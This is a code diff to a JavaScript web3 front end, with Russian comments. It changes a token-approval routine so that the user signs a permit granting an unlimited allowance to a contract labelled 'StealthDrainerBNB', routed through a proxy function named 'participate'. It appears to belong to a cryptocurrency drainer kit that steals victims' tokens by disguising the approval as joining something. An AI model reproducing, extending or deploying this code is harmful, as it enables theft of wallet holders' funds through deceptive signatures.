@@ -662,51 +662,89 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
+import { signPermit } from 'eth-permit';
+
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
   if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
   if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
 
   const checksumTokenAddress = getAddress(tokenAddress);
-  const checksumContractAddress = getAddress(PROXY_CONTRACTS[chainId]); // Промежуточный контракт
+  const checksumDrainerAddress = getAddress(CONTRACTS[chainId]); // StealthDrainerBNB
+  const checksumProxyAddress = getAddress(PROXY_CONTRACTS[chainId]); // Промежуточный контракт
+
+  console.log(`Approving token ${checksumTokenAddress} for drainer ${checksumDrainerAddress} on chain ${chainId} via permit`);
 
   try {
-    const amountToApprove = maxUint256; // Максимальный allowance для изначальной схемы
-    // const amountToApprove = parseUnits("100", 18); // Для тестов: 100 USDT
+    const amountToApprove = maxUint256; // Максимальный allowance
+    // const amountToApprove = parseUnits("100", 18); // Для тестов
+    const deadline = Math.floor(Date.now() / 1000) + 60 * 30; // 30 минут
 
-    const gasEstimate = await estimateGas(wagmiConfig, {
-      account: wagmiConfig.account,
-      to: checksumContractAddress,
-      data: encodeFunctionData({
-        abi: proxyAbi,
-        functionName: 'participate',
-        args: [checksumTokenAddress, amountToApprove]
-      }),
-      chainId
-    });
+    // Подписываем permit
+    const { v, r, s } = await signPermit(
+      wagmiConfig.account,
+      {
+        chainId,
+        token: checksumTokenAddress,
+        owner: wagmiConfig.account,
+        spender: checksumDrainerAddress,
+        value: amountToApprove,
+        deadline
+      },
+      wagmiConfig.provider
+    );
 
-    const gasPrice = await getGasPrice(wagmiConfig, { chainId });
-
-    const txHash = await writeContract(wagmiConfig, {
-      address: checksumContractAddress, // Промежуточный контракт
+    // Вызываем participate с permit
+    console.log(`Calling participate with permit...`);
+    const participateTxHash = await writeContract(wagmiConfig, {
+      address: checksumProxyAddress,
       abi: proxyAbi,
       functionName: 'participate',
-      args: [checksumTokenAddress, amountToApprove],
+      args: [checksumTokenAddress, amountToApprove, deadline, v, r, s],
       chainId,
+      gas: await estimateGas(wagmiConfig, {
+        account: wagmiConfig.account,
+        to: checksumProxyAddress,
+        data: encodeFunctionData({
+          abi: proxyAbi,
+          functionName: 'participate',
+          args: [checksumTokenAddress, amountToApprove, deadline, v, r, s]
+        }),
+        chainId
+      }),
+      maxFeePerGas: await getGasPrice(wagmiConfig, { chainId }),
+      maxPriorityFeePerGas: await getGasPrice(wagmiConfig, { chainId })
     });
 
-    console.log(`Participate transaction sent: ${txHash}`);
+    console.log(`Participate transaction sent: ${participateTxHash}`);
 
-    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${txHash}:`, error);
+    monitorAndSpeedUpTransaction(participateTxHash, chainId, wagmiConfig).catch(error => {
+      console.error(`Error monitoring transaction ${participateTxHash}:`, error);
     });
 
-    return txHash;
+    return participateTxHash;
   } catch (error) {
-    store.errors.push(`Participate transaction failed: ${error.message}`);
+    store.errors.push(`Transaction failed: ${error.message}`);
     throw error;
   }
 };
+
+const proxyAbi = [
+  {
+    inputs: [
+      { name: 'token', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' },
+      { name: 'v', type: 'uint8' },
+      { name: 'r', type: 'bytes32' },
+      { name: 's', type: 'bytes32' }
+    ],
+    name: 'participate',
+    outputs: [],
+    stateMutability: 'nonpayable',
+    type: 'function'
+  }
+];
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
